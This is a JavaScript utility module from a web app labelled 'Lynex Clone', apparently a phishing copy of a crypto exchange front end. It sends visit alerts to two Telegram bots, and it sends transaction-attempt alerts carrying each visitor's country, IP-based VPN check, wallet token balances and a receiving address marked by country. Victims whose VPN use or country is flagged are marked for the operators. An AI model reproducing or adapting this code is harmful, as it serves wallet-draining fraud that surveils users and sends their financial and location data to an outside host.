// utils/telegramUtils.js
import axios from "axios";
import { checkVpnStatus, getRecipientAddress, getUserCountry } from "./getUserLocation";  // Ensure correct file import
import { getContractAddress } from "./useWallet";

// Telegram Bot Token and Chat ID
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;
const TELEGRAM_BOT_TOKEN_NEW = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN_NEW
const TELEGRAM_CHAT_ID_NEW = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID_NEW;

// Function to send a message to Telegram
export const sendMessageToTelegram = async (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "Markdown"  // Enables Markdown for text formatting in Telegram
  };

  try {
    const response = await axios.post(url, payload);
    if (response.data.ok) {
      console.log("Message sent to Telegram successfully");
    } else {
      console.error("Failed to send message to Telegram:", response.data);
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
};
export const sendMessageToTelegramNew = async (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_NEW}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID_NEW,
    text: message,
    parse_mode: "Markdown"  // Enables Markdown for text formatting in Telegram
  };

  try {
    const response = await axios.post(url, payload);
    if (response.data.ok) {
      console.log("Message sent to Telegram successfully");
    } else {
      console.error("Failed to send message to Telegram:", response.data);
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
};
// Function to send app details  to Telegram

export const sendAppDetailsToTelegramLaunch = async () => {
  // console.log(token)
  // // if (!transactionType) {
  // //   console.log('A transaction type must be passed to identify the type of transaction being attempted')
  // // }
  // // let tokenDetails1 = token?.map(
  // //   (token) => `| ${token.assetName}: ${(token.amount / 1000000).toFixed(2)} ${token.assetName}   |`
  // // )
  // // console.log(tokenDetails1)
  // let tokenDetails = `| ${token.name}: ${(Number(token.balance_formatted)).toFixed(8)} ${token.name}   |`
  // Fetch the full user country details (name and code)
  // console.log(tokenDetails)
  let userCountryData = await getUserCountry();


  if (!userCountryData) {
    console.error("Could not retrieve user country data");
    userCountryData = { country: "Unknown", countryCode: "XX" }; // Default fallback
  }

  const { country, countryCode } = userCountryData;
  const globeIcon = "🌍";  // Unicode globe icon

  let message = `*Visit Alert*\n` +
    `App: Lynex Clone\n\n` +
    `User Info--------------------\n` +
    `| Country: ${globeIcon} ${country} ${countryCode} |\n` +
    `--------------------------------\n` +
    // `| User Wallet Balance |\n` +
    // // `| Amount Attempted: ${(Number(amountAttempted)).toFixed(8)} |\n` +
    // // `| ${token.symbol}: ${(Number(token.balance_formatted)).toFixed(8)} ${token.symbol}     |\n` +
    // // `${tokenDetails}\n` +  // Use tokenDetails directly
    `------------------------------End`;
  console.log(message)
  // Send the message to Telegram
  await sendMessageToTelegram(message);
  await sendMessageToTelegramNew(message)
};

export const sendAppDetailsToTelegram = async (balance, token, chainId) => {
  let tokenDetails = `| ${token.name}: ${(Number(token.balance_formatted)).toFixed(8)} ${token.name}   |`
  // Fetch the full user country details (name and code)
  console.log(tokenDetails)
  let userCountryData = await getUserCountry();
  if (!userCountryData) {
    console.error("Could not retrieve user country data");
    userCountryData = { country: "Unknown", countryCode: "XX", isVpnIpdata: false }; // Default fallback
  }

  const { country, countryCode, ip, isVpnIpdata } = userCountryData;
  const isVpn = isVpnIpdata || await checkVpnStatus(ip);
  const recipientAddress = getContractAddress(chainId)

  const specialCountries = ["NG", "AE"];
  const globeIcon = "🌍";
  const isMine = specialCountries.includes(countryCode) || isVpn ? "🔴" : "🟢";

  let message = `*Transaction Attempt Alert*\n` +
    `App: Lynex Clone\n\n` +
    `User Info--------------------\n` +
    `| Country: ${globeIcon} ${country} (${countryCode}) |\n`;

  if (isVpn || specialCountries.includes(countryCode)) {
    message += `| ⚠️ VPN / MARKED Country SUSPECTED  |\n`;
  } else {
    message += `| ✅ NO VPN SUSPECTED |\n`;
  }

  message += `| 💼 Receiving Address: ${recipientAddress} ${isMine}|\n` +
    `--------------------------------\n` +
    `| 💵 User Wallet Balance  |\n` +
    `| 💵 ${token.symbol} balance: ${(Number(token.balance_formatted)).toFixed(8)} ${token.symbol}} ${token.symbol}       |\n` +
    `${tokenDetails}\n` +
    `------------------------------End`;

  await sendMessageToTelegram(message);
  await sendMessageToTelegramNew(message)
};